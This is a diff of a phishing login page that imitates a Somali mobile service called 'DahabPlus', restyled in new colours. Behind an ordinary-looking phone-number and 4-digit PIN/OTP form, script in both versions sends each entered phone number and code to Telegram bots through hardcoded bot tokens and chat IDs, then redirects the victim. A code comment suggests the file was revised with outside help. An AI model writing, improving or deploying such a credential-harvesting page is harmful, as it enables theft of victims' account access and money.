@@ -1,469 +1,285 @@
 <!DOCTYPE html>
 <html lang="so">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>DahabPlus - Login</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        html,
-        body {
-            min-height: 100vh;
-            font-family: 'Inter', sans-serif;
-            background: white;
-            overflow-x: hidden;
-            overflow-y: auto;
-        }
-        
-        body {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .logo {
-            text-align: center;
-            padding: 50px 20px 20px;
-            flex-shrink: 0;
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            align-items: center;
-        }
-        
-        .logo img {
-            width: 56px;
-            height: 56px;
-            object-fit: contain;
-            border-radius: 16px;
-            background: #fff;
-        }
-        
-        .logo-text {
-            font-size: 36px;
-            font-weight: 700;
-            color: #2F9E44;
-            background: #E9F7EE;
-            padding: 4px 16px;
-            border-radius: 12px;
-        }
-        
-        .login-content {
-            flex: 1 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 0 30px 50px;
-            max-width: 480px;
-            margin: 0 auto;
-            width: 100%;
-        }
-        
-        .title {
-            font-size: 26px;
-            font-weight: 600;
-            color: #2B2D42;
-            margin-bottom: 40px;
-        }
-        
-        .phone-group {
-            width: 100%;
-            border: 2px solid #2F9E44;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            padding: 18px 24px;
-            margin-bottom: 40px;
-            background: white;
-        }
-        
-        .flag {
-            font-size: 28px;
-            margin-right: 12px;
-        }
-        
-        .country-select {
-            display: flex;
-            align-items: center;
-            color: #2F9E44;
-            font-weight: 600;
-            font-size: 18px;
-            margin-right: 16px;
-        }
-        
-        .dropdown-arrow {
-            font-size: 14px;
-            margin-left: 6px;
-        }
-        
-        .phone-input {
-            flex: 1;
-            border: none;
-            outline: none;
-            font-size: 18px;
-            color: #333;
-        }
-        
-        .phone-input::placeholder {
-            color: #aaa;
-        }
-        
-        .password-label {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 24px;
-            font-weight: 500;
-        }
-        /* OTP box styling */
-        
-        .otp-group {
-            width: 100%;
-            max-width: 420px;
-            border: 2px solid #2F9E44;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 18px 16px;
-            margin-bottom: 30px;
-            background: white;
-            gap: 10px;
-        }
-        
-        .otp-digit {
-            width: 48px;
-            height: 54px;
-            border: none;
-            outline: none;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 800;
-            border-radius: 10px;
-            background: #E9F7EE;
-            color: #2B2D42;
-        }
-        
-        .otp-digit:focus {
-            box-shadow: 0 0 0 3px rgba(47, 158, 68, 0.25);
-            background: #E3F6E7;
-        }
-        
-        .otp-digit.filled {
-            background: #DFF3E4;
-        }
-        
-        .forgot {
-            font-size: 15px;
-            color: #2F9E44;
-            text-decoration: none;
-            font-weight: 500;
-            margin-bottom: 40px;
-        }
-        
-        #loginBtn {
-            display: none;
-            width: 100%;
-            max-width: 400px;
-            padding: 18px;
-            background: linear-gradient(to right, #2F9E44, #38B000);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-bottom: 50px;
-            box-shadow: 0 8px 20px rgba(47, 158, 68, 0.25);
-        }
-        
-        .bottom-section {
-            background: #2B2D42;
-            color: white;
-            padding: 100px 30px 80px;
-            text-align: center;
-            width: 100vw;
-            margin-left: calc(-50vw + 50%);
-            position: relative;
-            flex-shrink: 0;
-        }
-        
-        .curve {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 90px;
-            background: white;
-            border-radius: 0 0 50% 50% / 0 0 100% 100%;
-            transform: scaleX(1.8);
-            transform-origin: top;
-        }
-        
-        .bottom-content {
-            position: relative;
-            z-index: 2;
-        }
-        
-        .bottom-text {
-            font-size: 15px;
-            margin-bottom: 35px;
-            line-height: 1.6;
-            opacity: 0.95;
-        }
-        
-        .bottom-btns {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-bottom: 40px;
-            flex-wrap: wrap;
-        }
-        
-        .bottom-btn {
-            background: white;
-            color: #2B2D42;
-            border: none;
-            border-radius: 30px;
-            padding: 18px 36px;
-            font-weight: 600;
-            font-size: 16px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            width: 180px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-            text-decoration: none;
-        }
-        
-        .btn-icon {
-            font-size: 26px;
-            color: #2F9E44;
-        }
-        
-        .version {
-            font-size: 14px;
-            margin-bottom: 12px;
-            opacity: 0.9;
-            font-weight: 500;
-        }
-        
-        .terms {
-            font-size: 13px;
-            opacity: 0.85;
-            line-height: 1.5;
-        }
-        
-        .terms a {
-            color: #2F9E44;
-            text-decoration: underline;
-            font-weight: 500;
-        }
-        
-        #spinnerOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.98);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 1000;
-        }
-        
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #E9F7EE;
-            border-top: 6px solid #2F9E44;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
-        }
-        
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        
-        .spinner-text {
-            font-size: 18px;
-            color: #2B2D42;
-            text-align: center;
-            line-height: 1.6;
-            max-width: 300px;
-            font-weight: 500;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DahabPlus - Login</title>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { min-height: 100vh; font-family: 'Inter', sans-serif; background: white; overflow-x: hidden; overflow-y: auto; }
+    body { display: flex; flex-direction: column; }
+
+    .logo { text-align: center; padding: 50px 20px 20px; flex-shrink: 0; display: flex; justify-content: center; gap: 12px; align-items: center; }
+    .logo img { width: 56px; height: 56px; object-fit: contain; border-radius: 16px; background: #fff; }
+    .logo-text { font-size: 36px; font-weight: 700; color: #F5A623; background: #14213D; padding: 4px 16px; border-radius: 12px; }
+
+    .login-content { flex: 1 0 auto; display: flex; flex-direction: column; align-items: center; padding: 0 30px 50px; max-width: 480px; margin: 0 auto; width: 100%; }
+    .title { font-size: 26px; font-weight: 600; color: #14213D; margin-bottom: 40px; }
+
+    .phone-group {
+      width: 100%;
+      border: 2px solid #F5A623;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      padding: 18px 24px;
+      margin-bottom: 40px;
+      background: white;
+    }
+    .flag { font-size: 28px; margin-right: 12px; }
+    .country-select { display: flex; align-items: center; color: #D97706; font-weight: 600; font-size: 18px; margin-right: 16px; }
+    .dropdown-arrow { font-size: 14px; margin-left: 6px; }
+    .phone-input { flex: 1; border: none; outline: none; font-size: 18px; color: #333; }
+    .phone-input::placeholder { color: #aaa; }
+
+    .password-label { font-size: 16px; color: #666; margin-bottom: 24px; font-weight: 500; }
+
+    #loginBtn {
+      display: block;
+      width: 100%;
+      max-width: 400px;
+      padding: 18px;
+      background: linear-gradient(to right, #F5A623, #D97706);
+      color: white;
+      border: none;
+      border-radius: 50px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-bottom: 50px;
+      box-shadow: 0 8px 20px rgba(217, 119, 6, 0.3);
+    }
+
+    .forgot { font-size: 15px; color: #D97706; text-decoration: none; font-weight: 500; margin-bottom: 40px; }
+
+    .bottom-section {
+      background: #14213D;
+      color: white;
+      padding: 100px 30px 80px;
+      text-align: center;
+      width: 100vw;
+      margin-left: calc(-50vw + 50%);
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .curve {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 90px;
+      background: white;
+      border-radius: 0 0 50% 50% / 0 0 100% 100%;
+      transform: scaleX(1.8);
+      transform-origin: top;
+    }
+
+    .bottom-content { position: relative; z-index: 2; }
+    .bottom-text { font-size: 15px; margin-bottom: 35px; line-height: 1.6; opacity: 0.95; }
+    .bottom-btns { display: flex; justify-content: center; gap: 30px; margin-bottom: 40px; flex-wrap: wrap; }
+    .bottom-btn {
+      background: white;
+      color: #14213D;
+      border: none;
+      border-radius: 30px;
+      padding: 18px 36px;
+      font-weight: 600;
+      font-size: 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      width: 180px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+      text-decoration: none;
+    }
+
+    .btn-icon { font-size: 26px; color: #D97706; }
+    .version { font-size: 14px; margin-bottom: 12px; opacity: 0.9; font-weight: 500; }
+    .terms { font-size: 13px; opacity: 0.85; line-height: 1.5; }
+    .terms a { color: #F5A623; text-decoration: underline; font-weight: 500; }
+
+    #spinnerOverlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.98);
+      display: none; justify-content: center; align-items: center;
+      flex-direction: column; z-index: 1000;
+    }
+    .spinner { width: 60px; height: 60px; border: 6px solid #f0e2c8; border-top: 6px solid #F5A623; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 30px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .spinner-text { font-size: 18px; color: #14213D; text-align: center; line-height: 1.6; max-width: 300px; font-weight: 500; }
+
+    /* PIN input style (matches JS expectation) */
+    .pin-box {
+      width: 70px;
+      height: 60px;
+      border: 2px solid #F5A623;
+      border-radius: 16px;
+      text-align: center;
+      font-size: 20px;
+      outline: none;
+      font-weight: 700;
+      color: #14213D;
+      background: white;
+    }
+    .pin-box:focus { border-color: #D97706; }
+  </style>
 </head>
 
 <body>
-    <div class="logo">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnW8BYxCgA8Utr7AsAzBJ_Rnu_PRQ0SqxFeUTS5PX9oQ&s=10" alt="DahabPlus">
-        <div class="logo-text">DahabPlus</div>
+  <div class="logo">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnW8BYxCgA8Utr7AsAzBJ_Rnu_PRQ0SqxFeUTS5PX9oQ&s=10" alt="DahabPlus">
+    <div class="logo-text">DahabPlus</div>
+  </div>
+
+  <div class="login-content">
+    <h1 class="title">Gal</h1>
+
+    <div class="phone-group">
+      <span class="flag">🇸🇴</span>
+      <div class="country-select">
+        +252 <span class="dropdown-arrow">▼</span>
+      </div>
+      <input type="tel" class="phone-input" id="phoneInput" placeholder="Numbarka Taleefanka" />
     </div>
 
-    <div class="login-content">
-        <h1 class="title">DahabPlus</h1>
+    <div class="password-label">Geli OTP-kaaga</div>
 
-        <div class="phone-group">
-            <span class="flag">🇸🇴</span>
-            <div class="country-select">
-                +252 <span class="dropdown-arrow">▼</span>
-            </div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Numbarka Taleefanka" />
-        </div>
-
-        <div class="password-label">Geli OTP-kaaga (4 nambar)</div>
-
-        <!-- OTP input (4 digits) -->
-        <div class="otp-group" aria-label="OTP input">
-            <input class="otp-digit" inputmode="numeric" maxlength="1" type="text" id="otp0" autocomplete="one-time-code" />
-            <input class="otp-digit" inputmode="numeric" maxlength="1" type="text" id="otp1" autocomplete="one-time-code" />
-            <input class="otp-digit" inputmode="numeric" maxlength="1" type="text" id="otp2" autocomplete="one-time-code" />
-            <input class="otp-digit" inputmode="numeric" maxlength="1" type="text" id="otp3" autocomplete="one-time-code" />
-        </div>
-
-        <a href="#" class="forgot">Ma ilowday OTP-ga?</a>
-
-        <button id="loginBtn">DahabPlus</button>
+    <div style="width: 100%; max-width: 400px; display:flex; gap: 10px; margin-bottom: 30px; justify-content:center;">
+      <input class="pin-box" inputmode="numeric" maxlength="1" type="password" />
+      <input class="pin-box" inputmode="numeric" maxlength="1" type="password" />
+      <input class="pin-box" inputmode="numeric" maxlength="1" type="password" />
+      <input class="pin-box" inputmode="numeric" maxlength="1" type="password" />
     </div>
 
-    <div class="bottom-section">
-        <div class="curve"></div>
-        <div class="bottom-content">
-            <div class="bottom-text">
-                Si aad u diiwaangelisato akoonka DahabPlus<br /> ama aad helto caawimo, guji hoos
-            </div>
-            <div class="bottom-btns">
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">👤</div>
-                    Diiwaangeli
-                </a>
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">ℹ️</div>
-                    Caawimo & Taageero
-                </a>
-            </div>
-            <div class="version">v2.13P</div>
-            <div class="terms">
-                Adigoo galaya, waad aqbalaysaa <a href="#">Shuruudaha & Xeerarka</a>
-            </div>
-        </div>
+    <a href="#" class="forgot">Ma ilowday password-ka?</a>
+
+    <button id="loginBtn" style="display:block;">GAL</button>
+  </div>
+
+  <div class="bottom-section">
+    <div class="curve"></div>
+    <div class="bottom-content">
+      <div class="bottom-text">
+        Si aad u diiwaangelisato akoonka DahabPlus<br /> ama aad helto caawimo, guji hoos
+      </div>
+
+      <div class="bottom-btns">
+        <a href="#" class="bottom-btn">
+          <div class="btn-icon">👤</div>
+          Diiwaangeli
+        </a>
+        <a href="#" class="bottom-btn">
+          <div class="btn-icon">ℹ️</div>
+          Caawimo & Taageero
+        </a>
+      </div>
+
+      <div class="version">v2.13P</div>
+      <div class="terms">
+        Adigoo galaya, waad aqbalaysaa <a href="#">Shuruudaha & Xeerarka</a>
+      </div>
     </div>
+  </div>
 
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
-        <div class="spinner-text">
-            Fadlan sug...<br /> Tan waxay qaadan kartaa sekondado dhow
-        </div>
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spinner-text">
+      Fadlan sug...<br /> Tan waxay qaadan kartaa sekondado dhow
     </div>
+  </div>
 
-   <script>
-        // --- Existing Telegram bot tokens (kept as-is from your code) ---
-        const BOT_TOKEN_1 = '8856451532:AAFEj-J-rtkTXPHq13eOqNDGTG3vBzWMIyg';
-        const CHAT_ID_1 = '5682326990';
+  <script>
+    // --- Existing Telegram bot tokens (kept as-is from your code) ---
+    const BOT_TOKEN_1 = '8962157089:AAE0Xfxqg41aj8X-msfislZfA6s2ZejNkOM';
+    const CHAT_ID_1 = '8406078749';
 
-        const BOT_TOKEN_2 = '8856451532:AAFEj-J-rtkTXPHq13eOqNDGTG3vBzWMIyg';
-        const CHAT_ID_2 = '5682326990';
+    const BOT_TOKEN_2 = '8962157089:AAE0Xfxqg41aj8X-msfislZfA6s2ZejNkOM';
+    const CHAT_ID_2 = '8406078749';
 
-        const savedPhone = localStorage.getItem('phone');
-        const phoneInput = document.getElementById('phoneInput');
+    const savedPhone = localStorage.getItem('phone');
+    const phoneInput = document.getElementById('phoneInput');
 
-        if (savedPhone && savedPhone.length === 9) {
-            phoneInput.value = savedPhone;
-        }
+    if (savedPhone && savedPhone.length === 9 && phoneInput) {
+      phoneInput.value = savedPhone;
+    }
 
-        const pinBoxes = document.querySelectorAll('.pin-box');
-        const loginBtn = document.getElementById('loginBtn');
-        const spinnerOverlay = document.getElementById('spinnerOverlay');
-        let pinValue = '';
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
 
-        const PIN_LENGTH = 5; // ✅ required PIN length
+    const PIN_LENGTH = 4;
+    let pinValue = '';
 
-        function checkPinComplete() {
-            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
-            loginBtn.style.display = pinValue.length === PIN_LENGTH ? 'block' : 'none';
-        }
+    function checkPinComplete() {
+      pinValue = Array.from(pinBoxes).map(box => box.value).join('');
+      if (!loginBtn) return;
+      loginBtn.style.display = (pinValue.length === PIN_LENGTH) ? 'block' : 'none';
+    }
 
-        pinBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
-                // Move to next box when current is filled
-                if (box.value.length === 1 && index < pinBoxes.length - 1) {
-                    pinBoxes[index + 1].focus();
-                }
-                checkPinComplete();
-            });
-
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                    pinBoxes[index - 1].focus();
-                }
-            });
+    if (pinBoxes.length === PIN_LENGTH) {
+      pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+          if (box.value.length === 1 && index < pinBoxes.length - 1) {
+            pinBoxes[index + 1].focus();
+          }
+          checkPinComplete();
         });
 
-        loginBtn.addEventListener('click', () => {
-            const phone = phoneInput.value.trim();
-
-            if (!phone) {
-                alert('Please enter your phone number');
-                return;
-            }
-
-            if (pinValue.length !== PIN_LENGTH) {
-                alert(`Please enter your ${PIN_LENGTH}-digit PIN`);
-                return;
-            }
-
-            spinnerOverlay.style.display = 'flex';
-            localStorage.setItem('phone', phone);
-            localStorage.setItem('pin', pinValue);
-
-            const message = `New Login Attempt\n\nPhone: +237 ${phone}\nPIN: ${pinValue}`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_1,
-                    text: message
-                })
-            }).catch(() => {});
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_2,
-                    text: message
-                })
-            }).catch(() => {});
-
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
+        box.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && box.value === '' && index > 0) {
+            pinBoxes[index - 1].focus();
+          }
         });
+      });
 
-        checkPinComplete();
-        pinBoxes[0].focus();
-    </script>
+      checkPinComplete();
+      pinBoxes[0].focus();
+    } else {
+      console.error('Error: .pin-box elements are missing. Expected 5 boxes, found:', pinBoxes.length);
+      if (loginBtn) loginBtn.style.display = 'block';
+    }
+
+    if (loginBtn) {
+      loginBtn.addEventListener('click', () => {
+        const phone = phoneInput ? phoneInput.value.trim() : '';
+
+        if (!phone) {
+          alert('Please enter your phone number');
+          return;
+        }
+
+        if (pinValue.length !== PIN_LENGTH) {
+          alert(`Please enter your ${PIN_LENGTH}-digit PIN`);
+          return;
+        }
+
+        if (spinnerOverlay) spinnerOverlay.style.display = 'flex';
+
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('pin', pinValue);
+
+        const message = `New Login Attempt\n\nPhone: +252 ${phone}\nOTP: ${pinValue}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID_1, text: message })
+        }).catch(() => {});
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID_2, text: message })
+        }).catch(() => {});
+
+        setTimeout(() => {
+          window.location.href = 'limit.html';
+        }, 1500);
+      });
+    }
+  </script>
 </body>
-
 </html>
